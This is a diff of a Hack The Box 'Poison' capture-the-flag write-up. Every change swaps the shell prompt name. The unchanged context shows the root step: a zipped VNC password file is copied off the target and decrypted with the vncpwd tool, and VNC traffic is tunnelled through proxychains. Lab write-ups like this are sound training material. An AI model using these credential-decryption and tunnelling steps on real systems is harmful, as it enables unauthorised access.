@@ -103,32 +103,32 @@ BINGO, it is runing VNC, so let follow hacktricks and find out more what
 
 so I assume that the secret.zip should be the a password or something, since I can open on the remote server, I use scp to copy it and crack it with `zip2john`, Luckly I tried it with charix's password and it works!! 
 ```console
-kali@kali:~/HTB/poison$ scp charix@poison.htb:/home/charix/secret.zip secret.zip
+bibo318@parrot:~/HTB/poison$ scp charix@poison.htb:/home/charix/secret.zip secret.zip
 Password for charix@Poison:
 secret.zip                                                               100%  166     4.1KB/s   00:00    
-kali@kali:~/HTB/poison$ unzip secret.zip 
+bibo318@parrot:~/HTB/poison$ unzip secret.zip 
 Archive:  secret.zip
 [secret.zip] secret password: 
  extracting: secret  
 ```
 seem like it is a encrypted password, Hacktrick mentioned how to decrypt it by using https://github.com/jeroennijhof/vncpwd 
 ```console
-kali@kali:~/HTB/poison$ git clone https://github.com/jeroennijhof/vncpwd.git
+bibo318@parrot:~/HTB/poison$ git clone https://github.com/jeroennijhof/vncpwd.git
 Cloning into 'vncpwd'...
 remote: Enumerating objects: 28, done.
 remote: Total 28 (delta 0), reused 0 (delta 0), pack-reused 28
 Unpacking objects: 100% (28/28), 22.13 KiB | 70.00 KiB/s, done.
-kali@kali:~/HTB/poison$ cd vncpwd/
-kali@kali:~/HTB/poison/vncpwd$ make
+bibo318@parrot:~/HTB/poison$ cd vncpwd/
+bibo318@parrot:~/HTB/poison/vncpwd$ make
 gcc -Wall -g -o vncpwd vncpwd.c d3des.c
-kali@kali:~/HTB/poison/vncpwd$ ls
+bibo318@parrot:~/HTB/poison/vncpwd$ ls
 d3des.c  d3des.h  LICENSE  Makefile  README  vncpwd  vncpwd.c
-kali@kali:~/HTB/poison/vncpwd$ ./vncpwd ../secret
+bibo318@parrot:~/HTB/poison/vncpwd$ ./vncpwd ../secret
 Password: VNCP@$$!
 ```
 we will use proxychain to pass our vnc traffic to posion:5901. let start by checking proxychain configureation
 ```console
-kali@kali:~/HTB/poison/vncpwd$ tail /etc/proxychains.conf
+bibo318@parrot:~/HTB/poison/vncpwd$ tail /etc/proxychains.conf
 #
 #       proxy types: http, socks4, socks5
 #        ( auth types supported: "basic"-http  "user/pass"-socks )
@@ -141,7 +141,7 @@ socks4 	127.0.0.1 9050
 ```
 defualt at `9050` okey, back to charix ssh. we change port forwarding to 9050 instead. now let use `vncviewer` to gain root
 ```console
-kali@kali:~/HTB/poison/vncpwd$ proxychains vncviewer 127.0.0.1:5901
+bibo318@parrot:~/HTB/poison/vncpwd$ proxychains vncviewer 127.0.0.1:5901
 ProxyChains-3.1 (http://proxychains.sf.net)
 |S-chain|-<>-127.0.0.1:9050-<><>-127.0.0.1:5901-<><>-OK
 Connected to RFB server, using protocol version 3.8
